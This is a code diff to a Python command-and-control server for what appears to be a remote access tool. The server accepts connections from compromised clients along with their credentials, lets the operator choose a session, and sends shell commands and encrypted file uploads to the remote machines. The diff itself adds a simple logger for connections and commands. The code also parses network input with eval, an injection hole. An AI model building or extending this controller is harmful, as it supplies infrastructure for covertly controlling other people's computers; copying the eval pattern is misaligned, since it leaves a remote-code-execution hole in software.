@@ -5,7 +5,6 @@ import sys
 import time
 from prettytable import PrettyTable
 
-import logging
 
 from Crypto.Cipher import AES
 
@@ -99,11 +98,16 @@ def help():
 
 def use(session):
     session = int(session)
+    ip = connections[session]['address'][0]
+    port = connections[session]['address'][1]
     try:
         if connections[session]:
             client_socket = connections[session]['socket']
             while 1:
                 command = input(f"\n[*] You're interacting with {session} Enter command > ")
+
+                log(f'Command executed on [{ip}:{port}]:{command}')
+
                 if command == 'exit':                         
                     break                                           
                 
@@ -138,6 +142,7 @@ def listen_incoming():
         cred = client_socket.recv(4096).decode()
         cred = eval(cred) #TODO change eval to json.loads
         # connections.append(cred)
+        log(f'Connection recieved from:{address}')
         connection = {"address": address, 'socket': client_socket, 'cred':cred}
         connections.append(connection)
 
@@ -178,12 +183,20 @@ def upload(what, where, session):
     socket.send(ciper.encrypt(b"\n\r"))
     file.close()
 
+def log(log):
+    with open('example.log', 'a') as f:
+        date = time.asctime().split()
+        f.write(f'[INFO]{date[2]}-{date[1]}-{date[4]} {date[3]}:{log}\n')  
+    f.close() 
+    
 
 threading.Thread(target=listen_incoming).start()
 
 
 while 1:
     command = input("\n[*] Enter command > ")
+
+    log(f'Command executed:{command}')
     
     command = command.split(" ")
 
